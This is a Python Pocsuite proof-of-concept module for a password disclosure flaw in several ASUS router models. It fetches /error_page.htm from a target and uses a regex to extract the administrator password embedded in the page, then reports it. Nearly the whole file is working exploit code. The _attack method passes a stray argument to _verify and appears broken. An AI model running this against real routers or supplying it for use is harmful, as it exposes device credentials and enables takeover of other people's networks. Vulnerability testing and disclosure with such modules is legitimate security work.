#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Asus RT-N16 Password Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://sintonen.fi/advisories/asus-router-auth-bypass.txt'
    desc = 'Module exploits password disclosure vulnerability in Asus RT-N16 devices that allows to fetch credentials for the device.'


    vulDate = ''
    createDate = '2017-10-13'
    updateDate = '2017-10-13'

    appName = 'ASUS'
    appVersion = ['ASUS RT-N10U, firmware 3.0.0.4.374_168',
            'ASUS RT-N56U, firmware 3.0.0.4.374_979',
            'ASUS DSL-N55U, firmware 3.0.0.4.374_1397',
            'ASUS RT-AC66U, firmware 3.0.0.4.374_2050',
            'ASUS RT-N15U, firmware 3.0.0.4.374_16',
            'ASUS RT-N53, firmware 3.0.0.4.374_311',]
    dork = ''
    appPowerLink = 'https://www.asus.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/error_page.htm'
        resp = req.get(url)

        password = re.search("if\('1' == '0' \|\| '(.+?)' == 'admin'\)", resp.content)
        if resp.status_code == 200 and password:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Password'] = password.group(1)

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
